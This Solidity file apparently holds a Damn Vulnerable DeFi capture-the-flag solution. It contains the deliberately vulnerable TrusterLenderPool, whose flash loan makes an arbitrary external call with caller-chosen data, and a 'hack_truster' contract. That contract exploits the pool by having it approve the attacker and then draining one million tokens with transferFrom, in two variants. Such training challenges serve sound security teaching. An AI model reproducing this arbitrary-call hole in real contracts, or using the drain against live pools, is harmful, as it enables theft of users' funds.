// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}

contract hack_truster {
    uint256 constant amount = 1000000 ether;
    TrusterLenderPool private pool;
    IERC20 private token;
    address private hacker;

    constructor(address _pool, address _token) {
        pool = TrusterLenderPool(_pool);
        token = IERC20(_token);
        hacker = msg.sender;
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            amount
        );
        pool.flashLoan(0, hacker, address(token), data);
        token.transferFrom(address(pool), hacker, amount);
    }

    function attack_selector() public {
        bytes4 sel = getFuncSel("approve(address,uint256)");
        bytes memory data = abi.encodeWithSelector(sel, address(this), amount);
        pool.flashLoan(0, hacker, address(token), data);
        token.transferFrom(address(pool), hacker, amount);
    }

    function getFuncSel(string memory func) public pure returns (bytes4) {
        return bytes4(keccak256(bytes(func)));
    }
}
